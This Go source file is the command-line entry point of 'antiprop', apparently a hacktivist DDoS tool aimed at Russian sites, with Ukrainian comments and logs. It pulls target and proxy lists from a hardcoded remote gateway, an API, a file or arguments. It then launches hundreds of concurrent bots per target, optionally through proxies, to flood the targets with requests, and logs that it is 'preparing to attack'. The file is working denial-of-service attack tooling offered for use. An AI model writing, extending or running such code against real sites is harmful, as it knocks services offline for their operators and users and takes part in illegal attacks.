package cmd

import (
	"context"
	"os"
	"os/signal"
	"sync"
	"sync/atomic"
	"syscall"

	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"

	"github.com/meddion/anti-rusnya-ddos/pkg"
)

var (
	rootCmd = &cobra.Command{
		Use:   "antiprop",
		Short: "Надсилає багато запитів на обрані цілі.\nЦілі та проксі отримуєм через джерела (API, файл)",
		Args:  cobra.MinimumNArgs(0),
		Run:   run,
	}
	gateway     string
	src         string
	srcFile     string
	sites       string
	proxy       string
	apiVersion  int
	botsNum     int
	maxErrCount int
	checkProxy  bool
	onlyProxy   bool
)

func Execute() {
	rootCmd.Execute()
}

func init() {
	rootCmd.PersistentFlags().IntVar(&botsNum, "bots", 200, "кількість ботів (активних з'єднань)")
	rootCmd.PersistentFlags().IntVar(&maxErrCount, "errcount", 100, "к-сть помилок на бота, щоб той закінчив роботу")
	// proxy
	rootCmd.PersistentFlags().StringVar(&proxy, "proxy", "", "proxy API URL")
	rootCmd.PersistentFlags().BoolVar(&onlyProxy, "onlyproxy", false, "з'єднання тільки через проксі")
	rootCmd.PersistentFlags().BoolVar(&checkProxy, "checkproxy", true, "validates proxy")
	// sources
	rootCmd.PersistentFlags().StringVar(&sites, "sites", "", "sites API URL")
	rootCmd.PersistentFlags().StringVar(&srcFile, "file", "", "файл із цілями та проксі")
	rootCmd.PersistentFlags().StringVar(
		&gateway,
		"gateway",
		"http://rockstarbloggers.ru/hosts.json",
		"адреса, що повертає списки джерела для атаки",
	)
	rootCmd.PersistentFlags().StringVar(
		&src,
		"src",
		"",
		"джерело. адреса з якої отримати дані про атаку",
	)
	rootCmd.PersistentFlags().IntVar(
		&apiVersion,
		"api",
		2,
		"версія API джерела; досутпні версії: 1, 2",
	)
}

func run(cmd *cobra.Command, args []string) {
	// Shutdown signal
	rootCtx, termProg := context.WithCancel(context.Background())
	startOsSignalHandler(termProg)

	epoch := int64(0)
	for {
		atomic.AddInt64(&epoch, 1)

		select {
		case <-rootCtx.Done():
			return
		default:
		}

		var (
			targets []pkg.Target
			proxies []pkg.Proxy
			err     error
		)

		switch {
		// Get data from a file
		case srcFile != "":
			targets, proxies, err = pkg.GetDataFromFile(rootCtx, srcFile, apiVersion)
			if err != nil {
				log.Fatalf("Не вдалося прочитати вміст файлу '%s': %v", srcFile, err)
			}
		// Get sites and proxy seperatly
		case sites != "":
			log.Infof("Обране джерело для цілей: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", sites)
			targets, err = pkg.GetTargetsFromAPI(rootCtx, sites)
			if err != nil {
				log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
				continue
			}

			log.Infoln("Дані із джерела підвантажено.")

		// Get targets (no proxy) from args
		case len(args) > 0:
			targets = make([]pkg.Target, 0, len(args))
			for _, arg := range args {
				targets = append(targets, pkg.Target{URL: arg})
			}
		// Get data from API
		default:
			if src == "" {
				src, err = pkg.GetSrcFromAPIGateway(rootCtx, gateway)
				if err != nil {
					log.Errorf("Отримуючи списки джерел: %w", err)
					continue
				}
			}

			log.Infof("Обране джерело: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", src)

			targets, proxies, err = pkg.GetDataFromAPISrc(rootCtx, src, apiVersion)
			if err != nil {
				log.Errorf("Не вдалося отримати коректні дані від джерела: %v", err)
				continue
			}

			log.Infoln("Дані із джерела підвантажено.")
		}

		if proxy != "" {
			log.Infof("Обране джерело для проксі: %s\n (ПЕРЕВІРТЕ ЙОГО ДОСТОВІРНІСТЬ)", proxy)
			if p, err := pkg.GetProxyFromAPI(rootCtx, proxy); err != nil {
				log.Errorf("Не вдалося отримати коректні дані від проксі джерела: %v", err)
				continue
			} else {
				proxies = append(proxies, p...)
			}
			log.Infoln("Дані із джерела проксі підвантажено.")
		}

		validProxies := ProxyValidation(rootCtx, proxies)
		if len(validProxies) > 0 {
			log.Infoln("Знайдено валідних проксі: %d\n", len(validProxies))
			for i, proxy := range validProxies {
				log.Printf("%d) %s\n", i+1, proxy.IP)
			}
		} else {
			log.Infoln("Проксі не знайдено")
			if onlyProxy {
				log.Fatalln("Не можу продовжити")
			}
		}

		log.Infoln("Знайдено цілей:")
		validTargets := make([]pkg.Target, 0, len(targets))
		for i, target := range targets {
			if err := pkg.ValidateTarget(&target); err != nil {
				log.Errorf("Під час валідації даних про атаку (перевірте джерело): %v", err)
				continue
			}
			validTargets = append(validTargets, target)
			log.Printf("%d) %s\n", i+1, target.URL)
		}

		var wg sync.WaitGroup
		log.Infof("Готуюся до атаки русні :) Сесія: %d \n", epoch)
		for _, target := range validTargets {
			botSched := pkg.NewBotScheduler(target, validProxies, botsNum, maxErrCount, onlyProxy)
			if err := botSched.Start(rootCtx, &wg); err != nil {
				log.Errorf("Не вдалося запустити ботів: %v\n", err)
				continue
			}
		}

		wg.Wait()
	}
}

func startOsSignalHandler(terminate func()) {
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigs
		terminate()
		log.Infoln("Готуюся до закриття.")
	}()
}

func ProxyValidation(rootCtx context.Context, proxies []pkg.Proxy) []pkg.Proxy {
	if len(proxies) == 0 {
		return proxies
	}

	validProxies := make([]pkg.Proxy, 0, len(proxies))

	type result struct {
		p pkg.Proxy
		e error
	}
	resChan := make(chan result)
	var wg sync.WaitGroup
	wg.Add(len(proxies))

	go func() {
		wg.Wait()
		close(resChan)
	}()
	for _, proxy := range proxies {
		go func(proxy pkg.Proxy) {
			defer wg.Done()
			resChan <- result{proxy, pkg.ValidateProxy(rootCtx, proxy)}
		}(proxy)
	}

	for res := range resChan {
		if res.e != nil {
			log.Errorln(res.e)
		} else {
			validProxies = append(validProxies, res.p)
		}
	}

	return validProxies
}
